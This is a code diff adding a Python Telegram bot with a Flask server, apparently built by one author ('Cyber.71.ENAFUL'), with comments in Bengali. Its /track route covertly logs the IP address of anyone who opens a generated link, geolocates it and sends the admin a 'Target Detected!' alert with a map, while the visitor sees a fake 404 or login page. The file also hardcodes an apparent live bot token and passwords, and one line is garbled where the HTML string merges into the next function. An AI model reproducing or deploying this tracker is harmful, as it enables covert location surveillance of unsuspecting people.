@@ -1,0 +1,127 @@
+import telebot
+from telebot import types
+import requests
+from flask import Flask, request, render_template_string, redirect, session, url_for
+import threading
+import geocoder
+from datetime import datetime
+
+# --- ১. কনফিগারেশন ---
+API_TOKEN = '8756220877:AAGKKlYU8MDptXx2b5-EvCG_hwgRREhDfQk' 
+ADMIN_USERNAME = 'KING_OF_ENAFUL'
+ADMIN_ID = None
+SERVER_PASSWORD = "CYBER 71ENAFUL" # আপনার দেওয়া পাসওয়ার্ড
+
+bot = telebot.TeleBot(API_TOKEN)
+app = Flask(__name__)
+app.secret_key = "enaful_secret_key" # সেশন সেভ করার জন্য একটি সিক্রেট কি
+
+# Ngrok ব্যবহার করলে এখানে আপনার এনগ্রোক লিঙ্কটি বসাবেন
+SERVER_URL = "http://localhost:5000" 
+
+# --- ২. লগইন পেজ টেমপ্লেট ---
+LOGIN_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Server Login - Cyber.71.ENAFUL</title>
+    <style>
+        body { background-color: black; color: #00ff00; text-align: center; padding-top: 100px; font-family: monospace; }
+        input { padding: 10px; background: #222; color: #00ff00; border: 1px solid #00ff00; margin: 10px; }
+        button { padding: 10px 20px; background: #00ff00; color: black; border: none; cursor: pointer; font-weight: bold; }
+        .error { color: red; }
+    </style>
+</head>
+<body>
+    <h1>🔒 Private Server Access</h1>
+    <form method="POST">
+        <input type="password" name="password" placeholder="Enter Password" required><br>
+        <button type="submit">LOGIN</button>
+    </form>
+    {% if error %}<p class="error">{{ error }}</p>{% endif %}
+</body>
+</html>
+"""
+
+# --- ৩. রুট এবং লগইন লজিক ---
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    error = None
+    if request.method == 'POST':
+        if request.form.get('password') == SERVER_PASSWORD:
+            session['logged_in'] = True
+            return redirect(url_for('home'))
+        else:
+            error = "ভুল পাসওয়ার্ড! আবার চেষ্টা করুন।"
+    return render_template_string(LOGIN_HTML, error=error)
+
+@app.route('/home')
+def home():
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+    return """
+    <body style="background-color:black; color:green; text-align:center; padding-top:100px; font-family:monospace;">
+        <h1>Cyber.71.ENAFUL Server is Live</h1>
+        <p>Managed by Boss Enaful</p>
+    </body>
+    """
+
+# --- ৪. ট্র্যাকিং পেজ ---
+@app.route('/track')
+def track_user():
+    # ট্র্যাকিংয়ের সময় ইউজারের আইপি ও লোকেশন সরাসরি নেওয়া হবে
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    g = geocoder.ip(user_ip)
+    lat_lng = g.latlng if g.latlng else [0, 0]
+    location_info = f"{g.city}, {g.country}" if g.city else "অজানা লোকেশন"
+    
+    map_link = f"https://www.google.com/maps?q={lat_lng[0]},{lat_lng[1]}"
+    
+    alert = (
+        "⚠️ **Target Detected!** ⚠️\n\n"
+        f"🌐 **IP:** `{user_ip}`\n"
+        f"📍 **Location:** {location_info}\n"
+        f"🗺️ **Maps:** [Open Map]({map_link})"
+    )
+    
+    if ADMIN_ID:
+        bot.send_message(ADMIN_ID, alert, parse_mode="Markdown")
+    
+    # ইউজার যদি আগে লগইন না করে থাকে তবে তাকে পাসওয়ার্ড পেজে পাঠাবে
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+        
+    return "<h1>404 Not Found</h1@bot.message_handler(commands=['start'])
+def welcome_list(message):
+    global ADMIN_ID
+    if message.from_user.username == ADMIN_USERNAME:
+        ADMIN_ID = message.chat.id
+
+    markup = types.InlineKeyboardMarkup()
+    owner_btn = types.InlineKeyboardButton(text="👤 BOT OWNER: ENAFUL", url=f"https://t.me/{ADMIN_USERNAME}")
+    markup.add(owner_btn)
+
+    welcome_text = (
+        "👋 **Welcome to Cyber.71.ENAFUL Bot**\n\n"
+        "🛠 **Status:** Active\n"
+        f"👑 **Owner:** Boss Enaful\n"
+        f"🆔 **Username:** @{ADMIN_USERNAME}\n\n"
+        "নিচের বাটনে ক্লিক করে সরাসরি যোগাযোগ করতে পারেন।"
+    )
+    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")
+
+@bot.message_handler(commands=['gen'])
+def generate_link(message):
+    if message.chat.id == ADMIN_ID:
+        bot.reply_to(message, f"🔗 Your Protected Link: `{SERVER_URL}/track`", parse_mode="Markdown")
+    else:
+        bot.reply_to(message, "Access Denied!")
+
+def run_flask():
+    app.run(host='0.0.0.0', port=5000, use_reloader=False)
+
+if __name__ == '__main__':
+    threading.Thread(target=run_flask).start()
+    print("সার্ভার এবং পাসওয়ার্ড প্রোটেকশন চালু হয়েছে...")
+    bot.infinity_polling()
+
